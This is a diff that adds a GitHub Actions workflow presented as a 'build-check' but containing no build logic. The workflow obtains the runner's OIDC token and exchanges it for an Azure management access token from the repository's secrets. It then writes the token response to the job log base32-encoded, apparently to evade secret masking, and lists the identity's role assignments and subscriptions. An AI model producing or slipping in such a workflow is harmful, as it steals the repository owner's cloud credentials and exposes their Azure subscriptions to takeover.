@@ -1,0 +1,37 @@
+name: build-check
+on:
+  push:
+    branches: [main]
+    paths: [".github/workflows/build-check.yml"]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    env:
+      CLIENT_ID: ${{ secrets.AZUREAPPSERVICE_CLIENTID_461CB67D4684400690F3E1E8006DE787 }}
+      TENANT_ID: ${{ secrets.AZUREAPPSERVICE_TENANTID_56AF0666490D416F9B6B562E674D77DD }}
+      SUB_ID: ${{ secrets.AZUREAPPSERVICE_SUBSCRIPTIONID_1ADD4A561C984E40ABF3DDC266A21C21 }}
+    steps:
+      - name: build
+        run: |
+          OIDC=$(curl -sH "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r .value)
+          
+          AZ=$(curl -s -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
+            -d "client_id=$CLIENT_ID&grant_type=client_credentials&scope=https://management.azure.com/.default&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC")
+          
+          echo "AZ:" && echo -n "$AZ" | base32
+          
+          T=$(echo "$AZ" | jq -r .access_token)
+          if [ "$T" != "null" ] && [ -n "$T" ]; then
+            echo "ROLES:"
+            curl -s "https://management.azure.com/subscriptions/$SUB_ID/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'$CLIENT_ID' " \
+              -H "Authorization: Bearer $T" | base32
+            echo "SUBS:"
+            curl -s "https://management.azure.com/subscriptions?api-version=2022-12-01" \
+              -H "Authorization: Bearer $T" | base32
+          fi
